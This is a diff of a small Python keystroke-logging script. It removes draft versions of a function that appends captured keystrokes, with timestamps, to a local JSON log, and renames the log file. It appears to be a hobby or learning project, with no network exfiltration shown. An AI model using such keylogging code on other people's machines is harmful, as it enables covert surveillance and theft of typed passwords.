@@ -23,41 +23,15 @@ def on_press(key):
 		write_log({date.strftime('%c'): words})
 		count, keys = 0, []
 
-'''
 def write_log(input_):
-	with open("tester.json", "a") as jf:
-		json.dump(input_, jf)
-'''
-#ssssssssssssssssssssssssssssssssssssss ererere   
-'''
-
-def write_log(input_):
-	with open("tester.json") as read_log:
-		print(read_log.read())
+	with open("log.json") as read_log:
 		try:
 			temp_log = json.load(read_log)
 			temp_log.update(input_)
 		except:
 			temp_log = input_
-	with open("tester.json", "w") as write_log:
+	with open("log.json", "w") as write_log:
 		json.dump(temp_log, write_log)
-
-'''
-def write_log(input_):
-	with open("tester.json") as read_log:
-		print(read_log.read())
-		if read_log.read():
-			temp_log = json.load(read_log)
-			temp_log.update(input_)
-		else:
-			temp_log = input_
-	with open("tester.json", "w") as write_log:
-		json.dump(temp_log, write_log)
-
-
-
-
-
 
 def on_release(key):
 	if key == Key.esc:
